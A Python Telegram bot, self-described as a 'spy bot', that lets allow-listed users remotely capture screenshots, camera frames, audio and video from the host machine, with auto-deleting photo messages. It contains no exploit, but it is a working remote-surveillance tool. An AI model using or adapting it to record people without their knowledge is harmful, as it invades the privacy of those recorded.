from utils import * 
from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import logging

TOKEN = getEnv('TOKEN')
ALLOWED_USERS = getEnv('ALLOWED_USERS', cast=int, isList=True)
ADMIN = getEnv('ADMIN')

bot = TeleBot(TOKEN, parse_mode='HTML')
audioRecorder = AudioRecorder()
videoRecorder = VideoRecorder()

# remind the user when a long recording in progress
class Reminder:

    def __init__(self, timeOut=10 * 60):
        self.timeOut = timeOut  # interval to notify the user, 10 minute default
        self.timer: Timer
        self.userid: int = 0


    def remind(self, userid: int):
        self.userid = userid
        self.timer = RepeatTimer(self.timeOut, self.nudge)
        self.timer.start()

    def nudge(self):
        message = bot.send_message(self.userid, "Recording in progress. Don't forget to finish")
        deleteMessage(message,10) # delete this notification after 10 seconds

    def cancel(self):
        self.timer.cancel()


remind = Reminder()


def deleteMessage(message, delay=0):
    # delete a message, optionally define a delay for the delete
    def tempDelete(message):
        bot.delete_message(message.chat.id, message.message_id)
    if delay: # dely non zero means delete some times later
        Timer(delay,tempDelete,[message]).start()
    else:
        tempDelete(message)


def make_logger():
    #Create the logger
    logger = logging.getLogger('Tel')
    logger.setLevel(logging.INFO)
    fh = logging.FileHandler("tel.log")
    fh.setLevel(logging.INFO)
    fh.setFormatter(logging.Formatter("[%(asctime)s] - %(message)s","%d-%m-%Y %I:%M:%S %p"))
    logger.addHandler(fh)
    return logger

logger = make_logger()




def checkRequest(message):
    # check if the request is from a valid user, if not send a notification to admin
    user = message.from_user

    if user.id not in ALLOWED_USERS:
        bot.send_message(user.id, "You are not authorized to use this bot")
        bot.send_message(ADMIN,f'Incoming request from unregistered user {user.first_name} {user.last_name} ({user.id})')
        logger.info(f'***Incoming request from unregistered user {user.first_name} {user.last_name} ({user.id})')
        return True
    logger.info(f"User: {user.first_name} {user.last_name} ({user.id}); Command: {message.text}")
    return False


@bot.message_handler(commands='start')
def send_welcome(message):
    if checkRequest(message):
        return
    bot.send_message(message.from_user.id, "Welcome to the spy bot")


@bot.message_handler(commands='photo')
def send_photo(message):
    takePhoto(message,toDelete=True)


@bot.message_handler(commands='photo_keep')
def send_photo2(message):
    takePhoto(message)



def takePhoto(message, toDelete=False):
    # capture and send the photo, optionally delete after 5 second
    user = message.from_user.id
    if checkRequest(message):
        return

    if videoRecorder.isRunning():
        # bot.send_message(user, "Video recording is in progress. Can't capture photo.")
        waitM = bot.send_message(user, "Video recording is in progress. Wait while the bot takes the photo")
        file = videoRecorder.captureAphoto()
    else:
        waitM = bot.send_message(user, "Wait while the bot takes the photo")
        file = takeScreenShot()
    with open(file, 'rb') as f:
        try:
            photoM = bot.send_photo(user, f, caption= "This photo will be deleted after 5 seconds." if toDelete else None)
        except Exception as e:
            logger.info(e)
    bot.delete_message(waitM.chat.id, waitM.message_id)

    if toDelete: # wait for 5 sectond and delete
        deleteMessage(photoM,5)
        deleteMessage(message,5)




@bot.message_handler(commands='audio')
def send_audio(message):
    # start audio recording
    user = message.from_user.id
    if checkRequest(message):
        return

    if audioRecorder.isRunning():
        bot.send_message(user, "Recording already in progress.")
    else:
        audioRecorder.start()
        bot.send_message(user, "Recording in progress.", reply_markup=audioMarkup())
        remind.remind(user)


def audioMarkup():
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(InlineKeyboardButton("Finish", callback_data="cb_stop_audio"),
               InlineKeyboardButton("Cancel", callback_data="cb_cancel_audio"))
    return markup


@bot.message_handler(commands='videoonly')
def send_video(message):
    user = message.from_user.id
    if checkRequest(message):
        return

    if videoRecorder.isRunning():
        bot.send_message(user, "Recording already in progress.")
    else:
        videoRecorder.start()
        bot.send_message(user, "Recording in progress.", reply_markup=videoOnlyMarkup())
        remind.remind(user)


def videoOnlyMarkup():
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(InlineKeyboardButton("Finish", callback_data="cb_stop_videoonly"),
               InlineKeyboardButton("Cancel", callback_data="cb_cancel_videoonly"))
    return markup


@bot.message_handler(commands='video')
def send_both(message):
    user = message.from_user.id
    if checkRequest(message):
        return

    if videoRecorder.isRunning() or audioRecorder.isRunning():
        bot.send_message(user, "Recording already in progress.")
    else:
        audioRecorder.start()
        videoRecorder.start()
        bot.send_message(user, "Recording in progress.", reply_markup=videoMarkup())
        remind.remind(user)


def videoMarkup():
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(InlineKeyboardButton("Finish", callback_data="cb_stop_video"),
               InlineKeyboardButton("Cancel", callback_data="cb_cancel_video"))
    return markup


@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    remind.cancel()  # clear all reminder
    user = call.from_user.id
    deleteMessage(call.message)
    if call.data == "cb_stop_audio":
        if not audioRecorder.isRunning():
            bot.send_message(user, "No recording is currently in progress !!!")
            return
    
        message = bot.send_message(user, "Processing please wait")
        processAndUpload(user, *audioRecorder.finish(toM4A=True))
        deleteMessage(message)

    elif call.data == "cb_cancel_audio":
        terminate(user, audioRecorder)

    #------------------------------------------------------------------------

    elif call.data == "cb_stop_videoonly":
        if not videoRecorder.isRunning():
            bot.send_message(user, "No recording is currently in progress !!!")
            return

        message = bot.send_message(user, "Processing please wait")
        processAndUpload(user, *videoRecorder.finish())
        deleteMessage(message)

    elif call.data == "cb_cancel_videoonly":
        terminate(user, videoRecorder)

    #-----------------------------------------------------------------
    elif call.data == "cb_stop_video":
        if not audioRecorder.isRunning() or not videoRecorder.isRunning():
            bot.send_message(user, "No recording is currently in progress !!!")
            return

        message = bot.send_message(user, "Processing please wait")
        audFile, _ = audioRecorder.finish()
        processAndUpload(user, *videoRecorder.finishWithAudio(audFile))
        deleteMessage(message)

    elif call.data == "cb_cancel_video":
        terminate(user, videoRecorder, audioRecorder)


def processAndUpload(user, file, act):
    # process recording and send to user
    logger.info(f"Recording finished: {os.path.basename(file)} ({act:.2f} sec) ({os.path.getsize(file)/1e6:.2f} MB)")
    files = splitFilesInChunks(file, act, chunks=600)
    nTxt = "The file will be split due to Telegram restrictions." if len(files)>1 else ""
    message = bot.send_message(user, 
        "Recording saved successfully. Wait while the bot uploads the file. " + nTxt)
    try:
        for file in files:
            with open(file, 'rb') as f:
                if file.endswith('mp4'):
                    bot.send_video(user, f)
                else:
                    bot.send_audio(user, f)
    except:
        bot.send_message(user, 
        f"Something went wrong while uploading the file file. You can find the file stored as {file}")
    finally:
        if len(files)!=1: 
            removeFile(*files)
    deleteMessage(message)



def terminate(user, *recorders):
    for rec in recorders: 
        rec.terminate()
    bot.send_message(user, "Recording terminated")
    logger.info('Recording terminated')




def crashTheCode():
    import os 
    os._exit(1)  # exit all threads


bot.send_message(ADMIN, "Starting bot")
bot.infinity_polling()